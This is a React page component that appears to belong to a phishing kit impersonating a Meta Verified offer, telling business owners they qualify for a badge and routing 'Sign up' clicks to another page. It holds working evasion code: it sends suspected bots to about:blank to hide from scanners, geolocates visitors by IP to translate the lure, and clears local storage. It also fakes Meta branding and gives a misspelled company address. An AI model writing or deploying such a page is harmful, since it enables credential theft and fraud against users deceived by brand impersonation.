import { useEffect, useState, useMemo, useCallback } from 'react';
import { Link } from 'react-router';
import axios from 'axios';
import heroImage from '@/assets/images/and_more.jpg';
import verifiedIcon from '@/assets/images/star_pe.png';
import securityIcon from '@/assets/images/security.png';
import supportIcon from '@/assets/images/actor.png';
import engagementIcon from '@/assets/images/search.png';
import detectBot from '@/utils/detect_bot';
import { translateText } from '@/utils/translate';
import countryToLanguage from '@/utils/country_to_language';

const Index = () => {
    const [isLoading, setIsLoading] = useState(true);
    const [translatedTexts, setTranslatedTexts] = useState({});

    const defaultTexts = useMemo(
        () => ({
            heroTitle: 'Elevate your business with Meta Verified.',
            heroSubtitle: 'Your business account meets the requirements to earn the Verified badge',
            description1: 'When a business has a Verified badge, the number of people who trust its recommendations is nearly twice as high compared to businesses without a badge',
            description2: 'Why wait Sign up for Meta Verified today to add this badge to your profile and enjoy exclusive benefits',
            signUp: 'Sign up',
            benefitsIntro: 'As a Meta Verified business, you gain access to the following exclusive benefits',
            verifiedBadge: 'Verified badge',
            impersonationProtection: 'Protection against impersonation',
            customerSupport: '24/7 customer support',
            engagementFeatures: 'Features that increase customer engagement',
            commitmentTitle: 'Sign up for Meta Verified and show your commitment',
            sourceInfo: 'Source Based on an online survey commissioned by Meta with 3,974 participants across 44 countries Respondents were randomly asked how much they trust the authenticity of a business or creator with or without a Meta Verified badge The study was conducted by Meta Research Data was collected between December 4 and December 10, 2025',
            availabilityInfo: 'Available only in selected regions Businesses must meet certain requirements to be eligible',
            termsInfo: 'Meta Verified subscribers must accept the Terms of Service and comply with Instagram Terms of Use Facebook Terms of Service Facebook Community Standards and Instagram Community Guidelines'
        }),
        []
    );

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = async () => {
        try {
            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            try {
                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const data = response.data;
                const countryCode = data.country_code;
                const targetLang = countryToLanguage[countryCode] || 'en';

                if (targetLang !== 'en') {
                    await translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                setTranslatedTexts(defaultTexts);
            }

            setIsLoading(false);
        } catch (error) {
            console.error('Initialization error:', error);
            setIsLoading(false);
        }
    };

    useEffect(() => {
        localStorage.clear();
        initializeApp();
    }, []);

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    if (isLoading) {
        return (
            <div style={{
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                height: '100vh',
                backgroundColor: '#f1f4f7'
            }}>
                <div style={{
                    width: '40px',
                    height: '40px',
                    border: '3px solid #e4e6eb',
                    borderTop: '3px solid #0064e0',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite'
                }} />
                <style>
                    {`
                        @keyframes spin {
                            0% { transform: rotate(0deg); }
                            100% { transform: rotate(360deg); }
                        }
                    `}
                </style>
            </div>
        );
    }

    return (
        <div style={{ margin: 0, padding: 0, backgroundColor: '#f1f4f7' }}>
            <table border="0" cellPadding="0" cellSpacing="0" role="presentation" style={{ backgroundColor: '#f1f4f7', width: '100%' }}>
                <tbody>
                    <tr>
                        <td align="center" style={{ padding: 0 }}>
                            <table border="0" cellPadding="0" cellSpacing="0" role="presentation" style={{ maxWidth: '600px', margin: '0 auto', backgroundColor: '#f1f4f7', width: '100%' }}>
                                <tbody>
                                    <tr>
                                        <td align="center" style={{ padding: '4px 0' }}>
                                            <a href="https://www.meta.com" style={{ textDecoration: 'none' }} target="_blank" rel="noopener noreferrer">
                                                <img alt="Meta" src="https://client-data.knak.io/production/email_assets/5e501bf6edcaa/1RTDJfCbesRUcecjxajGHkaN1LLM8q0FeYFJ54qD.png?utm_source=email:690cc84720e98" style={{ display: 'block', border: 0, outline: 'none', width: '120px', height: 'auto' }} width="120" />
                                            </a>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <table align="center" border="0" cellPadding="0" cellSpacing="0" role="presentation" style={{ width: '100%', maxWidth: '600px', backgroundColor: '#ffffff', borderCollapse: 'collapse' }}>
                                <tbody>
                                    <tr>
                                        <td style={{ padding: 0 }}>
                                            <img alt="" src="https://client-data.knak.io/production/email_assets/5e501bf6edcaa/mGXSEJ7H0PjVWpizORBoQpqqPPs6DL7iyy4AUtZl.png?utm_source=email:690cc84720e98" style={{ display: 'block', border: 0, width: '100%', height: 'auto' }} />
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: 0, lineHeight: '30px', height: '30px', fontSize: 0 }}> </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '16px 24px 8px 24px' }}>
                                            <div style={{ fontFamily: 'Arial,Helvetica,sans-serif', color: '#1c2b33', lineHeight: 1.3 }}>
                                                <div style={{ fontSize: '24px', fontWeight: 'bold' }}>{texts.heroTitle}</div>
                                                <div style={{ fontSize: '20px', fontWeight: 'bold', marginTop: '4px' }}>{texts.heroSubtitle}</div>
                                            </div>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '8px 24px' }}>
                                            <div style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '18px', lineHeight: 1.4, color: '#1c2b33', letterSpacing: '0.3px' }}>
                                                <p style={{ margin: 0 }}>
                                                    {texts.description1}<br />
                                                    {texts.description2}
                                                </p>
                                            </div>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '0 24px 16px 24px' }}>
                                            <Link to="/home" style={{ display: 'inline-block', padding: '12px 30px', backgroundColor: '#0064e0', color: '#ffffff', fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '14px', fontWeight: 'bold', textDecoration: 'none', borderRadius: '45px' }}>
                                                {texts.signUp}
                                            </Link>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '0 24px 24px 24px' }}>
                                            <img alt="24/7 support" src={heroImage} style={{ display: 'block', border: 0, width: '100%', height: 'auto', borderRadius: '16px' }} />
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '0 24px 8px 24px' }}>
                                            <div style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '18px', lineHeight: 1.4, color: '#1c2b33' }}>
                                                {texts.benefitsIntro}
                                            </div>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '12px 24px', borderTop: '2px solid #f1f4f7' }}>
                                            <table cellPadding="0" cellSpacing="0" role="presentation" width="100%">
                                                <tbody>
                                                    <tr>
                                                        <td style={{ paddingRight: '16px' }} valign="top" width="61">
                                                            <img alt="" src={verifiedIcon} style={{ display: 'block', border: 0, width: '61px', height: 'auto' }} />
                                                        </td>
                                                        <td style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '16px', color: '#1c2b33', fontWeight: 'bold' }} valign="middle">
                                                            {texts.verifiedBadge}
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '12px 24px', borderTop: '2px solid #f1f4f7' }}>
                                            <table cellPadding="0" cellSpacing="0" role="presentation" width="100%">
                                                <tbody>
                                                    <tr>
                                                        <td style={{ paddingRight: '16px' }} width="61">
                                                            <img alt="" src={securityIcon} style={{ display: 'block', border: 0, width: '61px', height: 'auto' }} />
                                                        </td>
                                                        <td style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '16px', color: '#1c2b33', fontWeight: 'bold' }}>
                                                            {texts.impersonationProtection}
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '12px 24px', borderTop: '2px solid #f1f4f7' }}>
                                            <table cellPadding="0" cellSpacing="0" role="presentation" width="100%">
                                                <tbody>
                                                    <tr>
                                                        <td style={{ paddingRight: '16px' }} width="61">
                                                            <img alt="" src={supportIcon} style={{ display: 'block', border: 0, width: '61px', height: 'auto' }} />
                                                        </td>
                                                        <td style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '16px', color: '#1c2b33', fontWeight: 'bold' }}>
                                                            {texts.customerSupport}
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '12px 24px 24px 24px', borderTop: '2px solid #f1f4f7', borderBottom: '2px solid #f1f4f7' }}>
                                            <table cellPadding="0" cellSpacing="0" role="presentation" width="100%">
                                                <tbody>
                                                    <tr>
                                                        <td style={{ paddingRight: '16px' }} width="61">
                                                            <img alt="" src={engagementIcon} style={{ display: 'block', border: 0, width: '61px', height: 'auto' }} />
                                                        </td>
                                                        <td style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '16px', color: '#1c2b33', fontWeight: 'bold' }}>
                                                            {texts.engagementFeatures}
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '24px 24px 8px 24px' }}>
                                            <div style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '18px', color: '#1c2b33' }}>
                                                {texts.commitmentTitle}
                                            </div>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '8px 24px 16px 24px' }}>
                                            <Link to="/home" style={{ display: 'inline-block', padding: '12px 30px', backgroundColor: '#0064e0', color: '#ffffff', fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '14px', fontWeight: 'bold', textDecoration: 'none', borderRadius: '45px' }}>
                                                {texts.signUp}
                                            </Link>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td style={{ padding: '16px 24px' }}>
                                            <div style={{ fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '11px', lineHeight: 1.5, color: '#67788a' }}>
                                                {texts.sourceInfo}<br />
                                                <br />
                                                {texts.availabilityInfo}<br />
                                                <br />
                                                {texts.termsInfo}
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>

                            <table align="center" border="0" cellPadding="0" cellSpacing="0" role="presentation" style={{ width: '100%', maxWidth: '600px', marginTop: '8px' }}>
                                <tbody>
                                    <tr>
                                        <td style={{ padding: '0 25px 20px 25px', fontFamily: 'Arial,Helvetica,sans-serif', fontSize: '12px', lineHeight: 1.4, color: '#67788a', textAlign: 'center' }}>
                                            <hr style={{ border: 'none', borderTop: '1px solid #cbd2d9', margin: '16px 0' }} />
                                            © 2026 Meta, 1610 Willows Roads, Menlos Parks, CA 90452
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    );
};

export default Index;
